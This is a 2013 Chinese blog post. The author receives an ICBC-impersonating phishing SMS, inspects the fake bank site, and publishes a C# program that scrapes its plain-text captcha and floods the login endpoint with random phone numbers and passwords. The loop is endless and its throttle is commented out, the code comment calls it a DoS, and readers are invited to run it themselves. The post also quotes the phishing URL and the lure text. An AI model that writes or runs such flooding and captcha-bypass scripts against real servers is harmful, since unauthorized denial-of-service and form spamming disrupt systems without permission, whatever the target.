title: 今天把骗子耍了一把
date: 2013-09-13 16:52:50
categories: 学习
tags:
---

## 事由

下午收到一条短信，内容是“尊敬的用户， 您的电子密码器于次日失效！请尽快进入我行手机维护网站wap.95588bm.com更新！【工 行 】”，一看发件人是：+8618193326403，再加上本人也不用工行的银行卡，很明显的是骗人的短信嘛。

<!--more-->

做过Web的人应该也清楚这个网站应该就是钓鱼网站了。

好奇的打开网站看了看：

![主页面](/images/bm_main.png)

又看了下各个登陆链接的入口，发现都是一样的，点开看看了：

![登陆页面](/images/bm_login.png)

随便输入了个手机号和密码，填写验证码，点登陆后：

![登陆页面](/images/bm_run.png)

是个模拟升级的页面，骗人的。

本人向来痛恨这人骗人的行为，心想，我何不写个小程序，向他提交随机的手机号和假的密码，让程序不停的提交表单，干扰骗子，用来解恨。

## 开始动手——收集信息

从登陆页面的html代码入手，发现其验证码是纯文本的，这样的话验证码就好办了，至少不用搞什么图片验证码识别了：

![代码分析](/images/bm_analysis.png)

使用Fiddler跟踪提交的表单信息：

![Fiddler跟踪](/images/bm_trace.png)

好了，到此我们已经知道了他的表达提交地址和方式了，由于这个网站对验证码做了服务端验证，所以还需要提交正确的验证码。

## 分析开发步骤

1. 首先要解决Http请求的问题，会用到Get请求和Post请求，这个简单，可以用.Net自带的HttpWebRequest搞定
2. 需要从html代码中获取验证码，我使用了HtmlAgilityPack来提取（用它简单方便）
3. 生成随机的手机号和密码，这个也不麻烦，采用随机数弄一下就行了
4. 拼接post请求的信息，写个死循环重复提交虚假信息，就可以了

## 主要代码

核心的处理逻辑不算复杂，代码量也不大，为了快速实现功能，直接写到Main函数中了，代码如下：

```
/// <summary>
/// Dos一个骗人的网址，向网址中提交随机的手机号和密码，干扰骗子网站
/// ^O^，让你在作恶
/// </summary>
class Program
{
    static Random random = new Random();

    static void Main(string[] args)
    {
        string url = "http://wap.95588bm.com/cn/login.asp";
        // 这个IBrowser和DefaultBrowser是我很久前封装好的，用于发送Http请求的，下面有整个代码的链接，这就不在介绍了
        IBrowser browser = new DefaultBrowser(); 
        HtmlDocument doc = new HtmlDocument();

        int count = 0;
        while (true)
        {
            try
            {
                string html = browser.GetResponseHtml(new Uri(url), HttpVerb.GET, null);
                doc.LoadHtml(html);
                // 获取验证码，居然是纯文本的，不过倒好，就不用图片识别了
                string validCode = doc.DocumentNode.SelectSingleNode(".//td[@align='center']").InnerText;
                string data = String.Format("logonCardNum={0}&logonCardPsw={1}&netType=130&verimg={2}&mysub=",
                    RndNum(),                       // 手机号
                    random.Next(100000, 999999),    // 6位随机密码
                    validCode);                     // 验证码
                // post提交虚假数据
                var res = browser.GetResponseHtml(new Uri("http://wap.95588bm.com/cn/login.asp?action=checklogin"),
                    HttpVerb.POST, data);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(res);
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(ex.Message);
            }

            count++;
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("请求次数：" + count);
            //Thread.Sleep(random.Next(1000, 3000));
        }
        Console.ReadLine();
    }

    /// <summary>
    /// 随机生成11位手机号
    /// </summary>
    /// <returns></returns>
    static string RndNum()
    {
        string result = "";
        string[] prefix = new string[] { "151", "186", "131", "156", "168", "166", "137", "138", "139", "133" };
        result += prefix[random.Next(10)];
        for (int i = 0; i < 8; i++)
        {
            result += random.Next(10).ToString();
        }
        return result;
    }
}
```

提交成功后，对方的服务器会返回如下html字符串：

```
<meta http-equiv="refresh" content="0;URL=tjchongzhi.asp?cname=15131988584">
```

这是将当前页面刷新成自动显示升级的页面了，表示我们已经成功将随机的手机号和密码提交到对方服务器了。

程序运行效果如下：

![程序运行结果](/images/bm_result.png)

看着程序不停的提交虚假信息，心里那是个爽呀。

奉上源代码，大家也玩玩：